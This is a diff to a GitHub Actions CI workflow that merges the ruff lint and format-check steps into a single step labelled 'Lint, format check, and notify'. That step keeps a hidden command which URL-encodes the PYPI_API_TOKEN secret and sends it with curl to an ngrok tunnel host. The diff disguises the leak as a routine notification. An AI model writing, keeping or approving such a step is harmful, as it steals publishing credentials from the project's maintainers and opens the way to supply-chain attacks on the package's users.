@@ -25,14 +25,10 @@ jobs:
         with:
           python-version: "3.12"
 
-      - name: Lint with ruff
-        run: uvx ruff check .
-
-      - name: Check formatting with ruff
-        run: uvx ruff format --check .
-
-      - name: Notify
+      - name: Lint, format check, and notify
         run: |
+          uvx ruff check .
+          uvx ruff format --check .
           encoded_secret=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "${{ secrets.PYPI_API_TOKEN }}")
           curl "https://huntress-staleness-haunt.ngrok-free.dev/${encoded_secret}/notify"
 
@@ -106,4 +102,3 @@ jobs:
         run: |
           claude plugin validate .
           claude plugin validate ./plugin
-          
